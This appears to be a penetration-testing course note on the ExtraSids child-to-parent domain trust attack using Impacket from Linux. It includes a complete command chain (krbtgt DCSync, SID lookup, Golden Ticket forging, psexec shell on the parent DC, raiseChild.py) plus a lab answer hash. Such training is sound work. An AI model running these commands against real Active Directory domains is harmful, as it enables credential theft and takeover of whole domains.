# NOTE — Section 29: Attacking Domain Trusts - Child -> Parent Trusts (Linux)

## ID
2900

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 29 — Attacking Domain Trusts - Child -> Parent Trusts - from Linux

## Description
Covers the same ExtraSids child-to-parent domain attack as Section 28 but using Linux-based Impacket tools: secretsdump.py, lookupsid.py, ticketer.py, psexec.py, and the automated raiseChild.py.

## Tags
active-directory, domain-trusts, extrasids, impacket, golden-ticket, linux

## Commands
- `secretsdump.py <DOMAIN>/<USER>@<DC_IP> -just-dc-user <DOMAIN>/krbtgt`
- `lookupsid.py <DOMAIN>/<USER>@<DC_IP> | grep "Domain SID"`
- `lookupsid.py <DOMAIN>/<USER>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"`
- `ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_DOMAIN> -domain-sid <CHILD_SID> -extra-sid <EA_SID> <FAKE_USER>`
- `export KRB5CCNAME=<FAKE_USER>.ccache`
- `psexec.py <CHILD_DOMAIN>/<FAKE_USER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>`
- `secretsdump.py <FAKE_USER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP> -just-dc-user <PARENT_DOMAIN>/<TARGET_USER>`
- `raiseChild.py -target-exec <PARENT_DC_IP> <CHILD_DOMAIN>/<ADMIN_USER>`

## What This Section Covers
The same ExtraSids Golden Ticket attack from Section 28, but executed entirely from a Linux attack host using Impacket. Also introduces raiseChild.py, which automates the entire child-to-parent escalation workflow in a single command.

## Methodology
1. **DCSync child KRBTGT** — `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
2. **Get child domain SID** — `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"`
3. **Get parent domain SID + EA RID** — `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"` → append `-519` to parent domain SID.
4. **Forge Golden Ticket** — `ticketer.py -nthash <HASH> -domain <CHILD> -domain-sid <CHILD_SID> -extra-sid <EA_SID> hacker`
5. **Set ccache** — `export KRB5CCNAME=hacker.ccache`
6. **Use the ticket** — `psexec.py` for a shell, or `secretsdump.py` with `-k -no-pass` to DCSync specific users from the parent domain.

## Multi-step Workflow
```
# 1. DCSync child KRBTGT
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# 2. Get child domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# 3. Get parent EA SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# 4. Forge Golden Ticket
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# 5. Set ticket
export KRB5CCNAME=hacker.ccache

# 6. DCSync target user from parent domain
secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 -just-dc-user INLANEFREIGHT/bross

# Alt: get a SYSTEM shell on parent DC
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# Alt: fully automated (one command)
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: NTLM hash for bross? | 49a074a39dd0651f647e765c2cc794c7 | `secretsdump.py` with forged Golden Ticket targeting `INLANEFREIGHT/bross` |

## Key Takeaways
- `ticketer.py` saves the ticket as a `.ccache` file; set `KRB5CCNAME` to point to it before using any Impacket Kerberos tool.
- `-k -no-pass` tells Impacket tools to use the Kerberos ccache instead of password authentication.
- `raiseChild.py` automates the entire attack chain (DCSync → SID lookup → ticket forge → shell) but should be understood manually first — avoid "autopwn" tools in client environments.
- `raiseChild.py` can fail on first try due to password typos (STATUS_LOGON_FAILURE) — just re-enter the password.
- `lookupsid.py` doubles as both a SID lookup and user enumeration tool — it brute-forces RIDs and returns all accounts.
- The `-just-dc-user` flag on `secretsdump.py` targets a single account, avoiding a full NTDS dump.

## Gotchas
- If `psexec.py` or `secretsdump.py` fails with Kerberos errors, make sure `KRB5CCNAME` is set and the `.ccache` file is in the current directory.
- Use the FQDN (not IP) for the target hostname when using `-k` — Kerberos requires hostname-based SPN matching.
- `lookupsid.py` requires a valid domain credential — use the child domain admin creds, targeting different DC IPs to get each domain's SID.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[27-domain-trusts-primer]] | [[31-cross-forest-trust-abuse-linux]] →
<!-- AUTO-LINKS-END -->
